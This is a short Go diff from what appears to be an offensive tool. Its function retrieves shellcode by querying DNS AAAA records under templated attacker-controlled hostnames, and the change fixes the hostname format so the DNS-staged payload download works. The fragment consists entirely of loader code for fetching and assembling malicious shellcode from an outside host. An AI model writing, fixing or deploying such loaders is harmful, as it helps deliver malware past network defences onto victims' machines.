@@ -82,7 +82,7 @@ func retreiveShellcodeAsBytes() []byte {
 	// This will increment through the AAAA records until it cannot find any addiitonal records
 	for {
 		dnsMessage := new(dns.Msg)
-    dnsMessage.SetQuestion(dns.Fqdn("{PREFIX}"+strconv.Itoa(i)+"{DOMAIN}"), dns.TypeAAAA)
+    dnsMessage.SetQuestion(dns.Fqdn("{PREFIX}"+strconv.Itoa(i)+".{DOMAIN}"), dns.TypeAAAA)
 		dnsMessage.RecursionDesired = true
 		dnsResponse, _, _ := dnsClient.Exchange(dnsMessage, net.JoinHostPort(dnsConfig.Servers[0], dnsConfig.Port))
 
